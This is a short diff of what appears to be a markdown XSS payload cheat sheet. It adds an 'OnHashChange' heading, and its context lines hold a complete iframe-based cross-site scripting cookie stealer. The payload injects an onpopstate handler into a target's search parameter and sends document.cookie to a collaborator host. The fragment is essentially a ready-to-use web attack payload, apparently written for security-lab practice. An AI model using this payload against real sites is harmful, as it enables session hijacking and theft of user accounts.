@@ -181,6 +181,8 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
 ```  
 
+### OnHashChange  
+
 >Below iframe uses **hash** character at end of URL to trigger the **OnHashChange** XSS cookie stealer.  
   
 ```JavaScript
